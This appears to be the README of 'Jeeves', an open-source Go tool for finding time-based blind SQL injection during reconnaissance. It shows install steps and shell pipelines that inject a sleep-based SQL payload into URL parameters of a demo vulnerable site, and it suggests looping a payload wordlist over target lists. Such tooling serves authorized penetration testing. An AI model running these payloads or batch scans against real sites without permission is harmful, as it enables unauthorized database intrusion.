<h3 align="center">Jeeves is made for looking to Time-Based Blind SQLInjection through recon.</h3>
<img src="gojayyyy.png">

## - Installation & Requirements:
```
> go install github.com/ferreiraklet/jeeves@latest

OR

> git clone https://github.com/ferreiraklet/jeeves.git

> cd jeeves

> go build jeeves.go

> chmod +x jeeves

> ./jeeves -h
```
<br>


## - Usage & Explanation:
  * In Your recon process, you may find endpoints that can be vulnerable to sql injection,
  
    * Ex: https://redacted.com/index.php?id=1

    <br>
  
    Jeeves reads from stdin:
  
    `echo 'https://redacted.com/index.php?id=your_time_based_blind_payload_here' | jeeves --payload-time time_payload`
    <br>
  
    In --payload-time you must use the time mentioned in payload.
 
    <br>
    
    **You can use a file containing a list of targets as well**:
  
    `cat targets | jeeves --payload-time 5`
  
    <br>
    
 * **You are able to use of Jeeves with other tools, such as gau, gauplus, waybackurls, qsreplace and bhedak, mastering his strenght**
    <br>
    * Another examples of usage:
  
    `echo "http://testphp.vulnweb.com/artists.php?artist=" | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves --payload-time 5`
    <br>
    `echo "http://testphp.vulnweb.com/artists.php?artist=" | qsreplace "(select(0)from(select(sleep(10)))v)" | jeeves --payload-time 10`
    
    TIP:
    
    Using with sql payloads wordlist
    `cat sql_wordlist.txt | while read payload;do echo http://testphp.vulnweb.com/artists.php?artist= | qsreplace $payload | jeeves --payload-time 5;done`
